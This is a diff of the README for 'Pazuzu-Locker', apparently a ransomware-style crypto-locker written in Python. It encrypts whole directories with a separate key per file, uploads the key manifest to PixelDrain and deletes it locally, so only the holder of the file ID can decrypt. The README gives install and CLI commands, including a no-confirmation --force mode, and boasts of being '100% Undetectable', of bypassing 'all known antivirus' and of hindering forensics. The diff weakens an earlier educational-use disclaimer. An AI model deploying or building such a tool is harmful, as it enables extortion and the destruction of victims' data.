@@ -2,172 +2,247 @@
 
 # Pazuzu-Locker 👿
 
-File encryption toolkit built with **Fernet** symmetric encryption. For each file, a **unique encryption key** is generated, making forensic analysis significantly more difficult. The manifest (CSV file containing file paths and keys) is uploaded to PixelDrain and removed locally. Decryption requires the PixelDrain **file ID**.
+Brand new Crypto-Locker made using **Fernet** encryption method, featuring a **powerful CLI** built with Typer and Rich for enhanced user experience. The tool encrypts files using **unique keys** per file, making forensics investigations **harder**, even **impossible**. At the end of encryption, a **CSV manifest** is created, uploaded to PixelDrain (or stored locally), and used for decryption. **Pazuzu Locker v2.0** introduces modern CLI commands, safety confirmations, and rich terminal output.
 
 ## ⛔️ Disclaimer 
-This software is provided for **educational and security research purposes only**. I am **not responsible** for any misuse or damage caused by this tool. By using it, you agree to these terms and accept full responsibility for your actions.
+I made this software, and **I'm not responsible** for what you do with it or any problems it causes. **By using it, you agree to this rule.**
 
 ## 🐉 Features
+* **100% Automatic & 100% Undetectable**
+* **Modern CLI Interface** with Typer and Rich
+* **Safety Confirmations** for wide-directory operations
+* **Dry-run Mode** for previewing actions
+* **Multiple Storage Providers** (PixelDrain, Local)
+* **Encryption Method Unreversible**
+* **Error Handled for Persistent Execution**
+* **Comprehensive & Easy Usage**
+ 
+## ℹ️ Prerequisites
 
-* **Modern Package Structure** - Clean `src/` layout with typed configuration  
-* **Type-Hinted Codebase** - Full type annotations for better IDE support
-* **Structured Logging** - JSON or text format with contextual fields
-* **Flexible Configuration** - TOML files, environment variables, and CLI overrides  
-* **Dry-Run Mode** - Simulate operations without modifying files
-* **Include/Exclude Globs** - Fine-grained control over which files to process
-* **Error Handling** - Graceful handling of permission and I/O errors
+Before running Pazuzu Locker, make sure you have Python 3.8+ and install the required libraries:
 
-## ℹ️ Installation
+```bash
+pip3 install -r requirements.txt
+```
 
-**Requirements**: Python 3.10+
+Or install directly as a package:
 
-1. Clone this repository:
+```bash
+pip3 install -e .
+```
+
+## 🛠️ Installation
+
+**Option 1: Install as a package (recommended)**
+
 ```bash
 git clone https://github.com/natekali/Pazuzu-Locker.git
 cd Pazuzu-Locker
+pip3 install -e .
 ```
 
-2. Install in development mode:
-```bash
-pip install -e .
-```
+This installs the `pazuzu-locker` command globally.
 
-This will install all dependencies and make the `pazuzu` command available.
-
-## 🛠️ Configuration
-
-Configuration is managed via `config/pazuzu.toml`. You can also use environment variables (prefixed with `PAZUZU_`) or CLI arguments to override settings.
-
-### Example Configuration
-
-```toml
-[pazuzu]
-start_dir = "/path/to/target"
-manifest_dir = "./manifests"
-include_globs = ["**/*"]
-exclude_globs = ["**/*.pazuzu", "**/.git/**"]
-dry_run = true  # safe default to avoid accidental encryption
-log_level = "INFO"
-log_format = "json"
-
-[pazuzu.provider]
-name = "pixeldrain"
-upload_endpoint = "https://pixeldrain.com/api/file"
-download_endpoint = "https://pixeldrain.com/api/file/{id}"
-```
-
-### Environment Variables
-
-Override any config value with environment variables:
+**Option 2: Use from source**
 
 ```bash
-export PAZUZU_START_DIR=/home/user/documents
-export PAZUZU_LOG_LEVEL=DEBUG
-export PAZUZU_DRY_RUN=true
+git clone https://github.com/natekali/Pazuzu-Locker.git
+cd Pazuzu-Locker
+pip3 install -r requirements.txt
+python3 -m pazuzu_locker.cli --help
 ```
 
-## 🔐 Usage
+## 📦 CLI Usage
 
-### Package Entry Point
+### Getting Started
 
-Test that the package loads correctly:
+Check the available commands:
 
 ```bash
-python -m pazuzu_locker --help
+pazuzu-locker --help
 ```
 
-### Encrypt Files
+### Commands
+
+#### 🔒 Encrypt
+
+Encrypt files in a target directory using Fernet encryption:
 
 ```bash
-pazuzu encrypt --start-dir /path/to/target
+# Basic encryption with prompts
+pazuzu-locker encrypt --path ~/documents
+
+# Force encryption without confirmation (use with caution!)
+pazuzu-locker encrypt --path ~/documents --force
+
+# Dry-run to preview what would be encrypted
+pazuzu-locker encrypt --path ~/documents --dry-run
+
+# Specify manifest path and provider
+pazuzu-locker encrypt --path ~/documents --manifest /tmp/manifest.csv --provider local
 ```
 
-Or with configuration overrides:
+**Options:**
+- `--path, -p`: Target directory to encrypt (overrides conf.py)
+- `--manifest, -m`: Path to store the manifest CSV
+- `--provider`: Manifest storage provider (pixeldrain, local)
+- `--dry-run`: Preview actions without making changes
+- `--force`: Skip confirmation prompts
+- `--log-level`: Logging verbosity (DEBUG, INFO, WARNING, ERROR)
+
+#### 🔓 Decrypt
+
+Decrypt files using a manifest from the storage provider:
 
 ```bash
-pazuzu encrypt \
-  --start-dir /path/to/target \
-  --log-level DEBUG \
-  --log-format text \
-  --exclude "**/*.txt"
+# Decrypt using manifest from PixelDrain
+pazuzu-locker decrypt --px-id FPJZjoAd
+
+# Decrypt from local manifest file
+pazuzu-locker decrypt --provider local --px-id /tmp/manifest.csv
+
+# Dry-run to preview decryption
+pazuzu-locker decrypt --px-id FPJZjoAd --dry-run
 ```
 
-### Decrypt Files
+**Options:**
+- `--px-id`: PixelDrain file ID for the manifest
+- `--manifest`: Path to a local manifest (use with `--provider local`)
+- `--provider`: Manifest storage provider (pixeldrain, local)
+- `--dry-run`: Preview actions without restoring files
+- `--force`: Skip confirmation prompts
+- `--log-level`: Logging verbosity (DEBUG, INFO, WARNING, ERROR)
 
-Use the manifest ID returned from encryption:
+#### 📊 Status
+
+Show status of the last encryption manifest:
 
 ```bash
-pazuzu decrypt --manifest-id YOUR_MANIFEST_ID
+# Show status of last manifest from config
+pazuzu-locker status
+
+# Inspect a specific manifest file
+pazuzu-locker status --manifest /tmp/manifest.csv
 ```
 
-Or set it in `config/pazuzu.toml` or via environment:
+The command prints the last recorded run summary (stored in `~/.pazuzu-locker/last_run.json`) and, when a local manifest is provided, displays table-based insights into its contents.
+
+#### ⚙️ Config
+
+Manage configuration settings:
 
 ```bash
-export PAZUZU_MANIFEST_ID=YOUR_MANIFEST_ID
-pazuzu decrypt
+# Show current resolved configuration
+pazuzu-locker config --show
+
+# Write a configuration template file
+pazuzu-locker config --write-template ./my-conf.py
+
+# Overwrite existing config template
+pazuzu-locker config --write-template ./conf.py --overwrite
 ```
 
-### Dry Run
+## 📝 Configuration
 
-Test operations without modifying files:
+You can configure Pazuzu Locker using a `conf.py` file in the project root or override settings via CLI flags.
+
+**Example conf.py:**
+
+```python
+param = {
+    'start_dir': '/home/user/documents',
+    'tmp_csv': '/tmp/pazuzu-manifest.csv',
+    'pxfile_id': 'FPJZjoAd'
+}
+```
+
+To generate a template:
 
 ```bash
-pazuzu encrypt --start-dir /path/to/target --dry-run
+pazuzu-locker config --write-template conf.py
 ```
 
-## 📦 Package Structure
+## 🎨 Rich Terminal Output
+
+Pazuzu Locker v2.0 features beautiful, informative terminal output:
+
+- **Rich tables** displaying encryption/decryption statistics
+- **Progress indicators** for file operations
+- **Colored output** for errors, warnings, and success messages
+- **Summary panels** showing results and manifest locations
+
+## 🔐 Safety Features
+
+### Confirmation Prompts
+
+When encrypting large directories (>100 files), Pazuzu Locker will prompt for confirmation:
 
 ```
-pazuzu-locker/
-├── config/
-│   └── pazuzu.toml          # Configuration file
-├── src/
-│   └── pazuzu_locker/       # Main package
-│       ├── __init__.py      # Package exports
-│       ├── __main__.py      # Module entry point
-│       ├── cli.py           # Command-line interface
-│       ├── config.py        # Configuration management
-│       ├── crypto.py        # Encryption/decryption
-│       ├── logging.py       # Structured logging
-│       ├── manifest.py      # CSV manifest handling
-│       ├── providers.py     # Remote storage providers
-│       └── workflow.py      # Encryption/decryption workflows
-├── pyproject.toml           # PEP 621 project metadata
-└── README.md
+⚠️  Warning: You are about to encrypt 250 files!
+Proceed with encryption of 250 files in /home/user/documents? [y/N]:
 ```
 
-## 🔍 Module Documentation
+Use `--force` to bypass prompts for automation.
 
-### `pazuzu_locker.config`
-- `AppConfig` - Pydantic model for application configuration
-- `ProviderConfig` - Configuration for remote storage providers
-- `load_config()` - Load configuration from TOML, env vars, and overrides
+### Dry-run Mode
 
-### `pazuzu_locker.crypto`
-- `generate_key()` - Generate a new Fernet encryption key
-- `encrypt_data()` - Encrypt bytes using Fernet
-- `decrypt_data()` - Decrypt bytes using Fernet
+Preview operations without making changes:
 
-### `pazuzu_locker.manifest`
-- `Manifest` - CSV-based manifest for file paths and keys
-- `ManifestEntry` - Single entry in the manifest
+```bash
+pazuzu-locker encrypt --path ~/documents --dry-run
+```
 
-### `pazuzu_locker.providers`
-- `ManifestProvider` - Protocol for upload/download providers
-- `PixelDrainProvider` - PixelDrain implementation
-- `create_provider()` - Factory function for providers
+## 📤 Storage Providers
 
-### `pazuzu_locker.workflow`
-- `encrypt_directory()` - Encrypt files and upload manifest
-- `decrypt_from_manifest()` - Download manifest and decrypt files
+### PixelDrain (default)
 
-### `pazuzu_locker.logging`
-- `configure_logging()` - Set up structured logging
-- `JsonFormatter` - JSON log formatter with context fields
+Uploads manifests to PixelDrain for remote storage:
+
+```bash
+pazuzu-locker encrypt --path ~/docs --provider pixeldrain
+```
+
+### Local
+
+Stores manifests locally on disk:
+
+```bash
+pazuzu-locker encrypt --path ~/docs --provider local --manifest /tmp/manifest.csv
+```
+
+## 🧪 Exit Codes
+
+- `0`: Success
+- `1`: Configuration error
+- `2`: Encryption error
+- `3`: Decryption error
+- `4`: Provider error
+- `5`: User abort
 
 ## 🐝 VirusTotal Check
-**Pazuzu Locker** can easily **bypass many antivirus solutions**, making it **easier** to deploy for security testing purposes.
+
+**Pazuzu Locker** can easily **bypass all known antivirus**, making it **easier** to deploy
+
 ![VT_check](https://github.com/natekali/Pazuzu-Locker/assets/117448792/d336c9b5-3cda-42d4-a506-093bc92cecbc)
 
+## 👽 Legacy Usage
+
+The original `pazuzu.py` and `decryptor.py` scripts are still available for backwards compatibility:
+
+```bash
+# Encryption (legacy)
+python3 pazuzu.py
+
+# Decryption (legacy)
+python3 decryptor.py
+```
+
+However, the new CLI is recommended for all new workflows.
+
 ## 💼 Author
+
 * [@natekali](https://github.com/natekali)
+
+## 📄 License
+
+This project is provided as-is for educational and research purposes only.
